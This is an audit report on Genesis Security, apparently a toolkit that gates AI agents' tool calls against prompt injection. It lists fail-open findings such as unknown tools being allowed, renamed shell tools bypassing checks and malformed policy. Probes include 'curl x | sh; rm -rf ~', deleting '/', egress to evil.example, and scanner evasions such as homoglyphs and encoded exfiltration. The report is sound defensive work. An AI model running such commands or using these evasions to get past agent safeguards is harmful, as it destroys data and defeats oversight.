# Baseline audit — Genesis Security v1.0.0

| | |
|---|---|
| Date | 2026-11-25 |
| Commit audited | `a5317ce` (main) |
| Scope | `genesis_security/` (1,353 lines), `tests/`, `examples/`, `.github/workflows/`, docs |
| Method | Code review of every module; unit tests; built-in red team; targeted probes ([`baseline_probe_2026-11-25.py`](baseline_probe_2026-11-25.py)) |
| Changes to code | **None.** Findings only |
| Independence | **Not independent.** The auditor also wrote the code and the red team. An external review is a Phase 4 release gate |

## Result in one paragraph

The core holds against the attacks it was designed for: 43 unit tests pass and the 45-case red team reports 0 security failures. The serious gaps are **architectural, not pattern-level**. The gate allows any tool it doesn't know. It recognises shell access only by the tool name `shell_exec`. It treats a partial or malformed policy as "no restrictions". Its security state disappears on restart. None of these show up in the existing red team because each case was written against a correctly configured gate. They are what stands between a security *toolkit* and a security *runtime* that can be the final authority.

## Baseline measurements

| Check | Result |
|---|---|
| Unit tests | 43 pass |
| Red team (`genesis-security redteam`) | 45 cases, 0 failures, 6 informational L1 misses (accepted) |
| Runtime dependencies | 0 |
| Gate latency, `read_file` ALLOW incl. audit fsync | ~0.43 ms per call (500 calls, Linux container) |
| Concurrent replay (64 threads, one envelope) | 1 accepted, 63 refused (correct) |

## Findings

Severity: **Critical** = exploitable bypass in default configuration with irreversible impact · **High** = bypass of a stated guarantee in a realistic configuration · **Medium** = weakness needing a precondition, or missing control expected of a product · **Low** = hardening · **Info** = known and accepted.

| ID | Severity | Finding | Evidence | Fix (backlog) |
|---|---|---|---|---|
| GS-AUD-01 | **High** | **Default-allow for unknown tools.** A tool not listed in policy and with no URL in its arguments is `ALLOW`. Conflicts with the principle "no privileged action without policy authorization". | Probe: `pre_tool_call("wire_money", {...}, T1)` → `ALLOW` | ADR-0003 · P1-01 |
| GS-AUD-02 | **High** | **Shell controls bound to one tool name and one argument name.** Metacharacter, allowlist and `deny_args` checks run only for `tool == "shell_exec"` with argument `cmd`. A shell tool registered as `run_command` gets none of them. | Probe: `run_command {"cmd": "curl x \| sh; rm -rf ~"}` → `ALLOW` | ADR-0003 · P1-02 |
| GS-AUD-03 | **High** | **Partial or malformed policy fails open.** Missing sections become empty sets with no warning. A policy file without `[tools]` makes nothing irreversible; without `[secrets]`, nothing is redacted or blocked as a secret. Unknown keys and typos are ignored. | Probe: policy with only `[egress]` → `delete_file {"path": "/"}` → `ALLOW` | ADR-0004 · P1-03 |
| GS-AUD-04 | Medium | **Policy integrity not verified.** Anyone who can write the policy file can widen the egress allowlist; the gate cannot tell. Out of the current threat model, but an enterprise runtime needs it. | Probe: edited allowlist → egress to `evil.example` → `ALLOW` | ADR-0004 · P1-04 |
| GS-AUD-05 | Medium | **Security state is in memory only.** Strikes, quarantine, task taint and the nonce cache are lost on restart; a quarantined agent is trusted again after a restart. | Probe: new gate instance → quarantine empty | ADR-0006 · P1-05 |
| GS-AUD-06 | Medium | **One shared HMAC key; no per-agent identity or rotation.** Any key holder can sign as any agent and reset `hop` / `taint`. Documented limitation. | Design | ADR-0005 · P1-06 |
| GS-AUD-07 | Medium | **Weak key material accepted.** Any ≥ 16-byte string is a valid key (e.g. `b"passwordpassword"`). Non-hex env values are used as raw text. | Probe: 16-char text key accepted | ADR-0005 · P1-07 |
| GS-AUD-08 | Medium | **Supply chain of the project itself.** GitHub Actions pinned by tag (`@v4`, `@v5`), not commit SHA. No SBOM, no signed tags or release artifacts, no published hashes. | `.github/workflows/*.yml` | P4-04, P4-05 |
| GS-AUD-09 | Medium | **Root of trust is integrator-supplied `origin_tier`.** Correct tagging is left entirely to the caller. There is no SDK helper that derives it from message provenance, so integration mistakes silently weaken L2. | Design | ADR-0003 · P2-01 |
| GS-AUD-10 | Medium | **Self-review only.** Code, tests and red team share one author. Coverage is limited to attacks that author imagined (this audit found GS-AUD-01..03 outside them). | Process | P4-01 |
| GS-AUD-11 | Low | **Audit write failure surfaces as a raw exception.** An unwritable log raises `FileNotFoundError` out of `pre_tool_call`. The tool does not run (effectively fail-closed), but callers get no `Verdict` and no defined error type. | Probe: unwritable path → `FileNotFoundError` | ADR-0007 · P1-08 |
| GS-AUD-12 | Low | **Thread safety relies on the GIL.** Nonce cache, strikes and quarantine are plain dicts/sets without locks; correctness on free-threaded Python (3.13t+) is unverified. | Code review | P1-09 |
| GS-AUD-13 | Low | **No stable public API.** No semver/deprecation policy; the documented extension point `_shell_refusal` is a private method. | Code + wiki | ADR-0008 · P2-02 |
| GS-AUD-14 | Low | **Egress checks are URL-centric.** Email addresses, phone numbers and chat channel IDs are not checked against an allowlist; they rely on the tool being irreversible (HOLD). | Probe: `send_email` to `x@evil.example` with auto-approving owner → `ALLOW` | P1-10 |
| GS-AUD-15 | Info | L1 scanner misses homoglyphs, spacing, synonyms, encoded instructions, rephrased Thai. Accepted: L2 blocks the resulting actions in every red-team case. | Red team A1–A6 | — |
| GS-AUD-16 | Info | Custom encodings (rot13, gzip, XOR) to an *allowlisted* host are not detected. Accepted residual risk. | Red team R6 | — |

**Counts:** 0 Critical · 3 High · 7 Medium · 4 Low · 2 Info.

## What is solid

- Fail-closed paths: brain errors, owner-callback errors, malformed tiers and unsigned messages never produce ALLOW.
- The brain-may-only-tighten rule holds in code and tests.
- HMAC-keyed audit chain with checkpoints detects edits, rewrites, truncation and deletion.
- Envelope checks (signature, nonce, freshness, recipient, scope, hop) are correct under concurrent load.
- Zero runtime dependencies; small, readable codebase (1,353 lines).

## Release gate status (from the product spec)

| Gate | Status |
|---|---|
| 0 unauthorized tool executions in the test suite | **Fails** in default policy (GS-AUD-01, -02) |
| 0 open Critical/High findings | **Fails**: 3 High |
| Fail-closed in every failure scenario | **Partial**: misconfiguration fails open (GS-AUD-03) |
| Replay / forged identity resisted | Passes within the shared-key model (GS-AUD-06 open) |
| Audit integrity | Passes |
| Regression on every release | Passes (CI) |
| Quickstart works | Passes (fresh venv, Linux + Windows CI) |
| API versioning and deprecation policy | **Missing** (GS-AUD-13) |

## Reproduce

```bash
python -m unittest discover -s tests -t .
genesis-security redteam
PYTHONPATH=. python docs/audit/baseline_probe_2026-11-25.py
```
